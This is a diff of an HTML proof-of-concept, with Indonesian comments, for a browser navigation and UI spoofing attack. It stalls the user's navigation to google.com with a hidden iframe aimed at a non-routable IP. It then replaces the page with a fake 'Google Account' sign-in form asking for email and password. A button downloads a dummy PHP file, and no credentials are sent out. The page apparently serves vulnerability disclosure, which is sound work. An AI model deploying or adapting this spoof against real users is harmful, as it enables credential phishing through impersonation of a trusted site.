@@ -2,26 +2,57 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>PoC 1 - Navigation Deception</title>
+  <title>PoC 2 - Prolonged UI Spoof</title>
 </head>
 <body>
   <div id="content">
-    <h1>Step 1</h1>
-    <p>Ketik <b>https://example.com</b> di omnibox lalu tekan Enter.</p>
+    <h1>Step 2</h1>
+    <p>Ketik <b>https://google.com</b> di omnibox lalu tekan Enter</p>
   </div>
 
   <script>
+    let triggered = false;
+
+    // Iframe untuk simulasi loading "macet" (Non-routable IP)
+    const iframe = document.createElement("iframe");
+    iframe.src = "https://10.255.255.1";  // Non-routable IP, simulasikan loading lama
+    iframe.style.display = "none";
+    document.body.appendChild(iframe);
+
+    // TRIGGER UTAMA (Enter di omnibox)
     window.onbeforeunload = function () {
-      setTimeout(() => {
-        document.getElementById("content").innerHTML = `
-          <h1>Example Secure Login</h1>
-          <p>Login untuk melanjutkan</p>
-          <input placeholder="Email"><br><br>
-          <input type="password" placeholder="Password">
-        `;
-      }, 100);
+      triggered = true;
     };
+
+    // Fungsi untuk delay lebih lama sebelum konten spoofing muncul
+    setTimeout(() => {
+      if (triggered) {
+        document.getElementById("content").innerHTML = `
+          <h1>Google Account</h1>
+          <p>Your session expired. Please sign in again.</p>
+          
+          <input placeholder="Email" style="display:block;margin-bottom:10px;width:220px">
+          <input type="password" placeholder="Password" style="display:block;margin-bottom:15px;width:220px">
+
+          <button onclick="downloadPHP()">Continue</button>
+        `;
+        triggered = false;
+      }
+    }, 5000); // Menunggu selama 5 detik (atau lebih lama) sebelum tampilkan login palsu
+
+    // Fungsi untuk download PHP (tanpa server)
+    function downloadPHP() {
+      const php = `<?php
+// Ini file PHP palsu
+echo "login palsu 😁";
+?>`;
+
+      const blob = new Blob([php], { type: "application/php" });
+      const a = document.createElement("a");
+      a.href = URL.createObjectURL(blob);
+      a.download = "login.php";
+      a.click();
+    }
   </script>
 </body>
 </html>
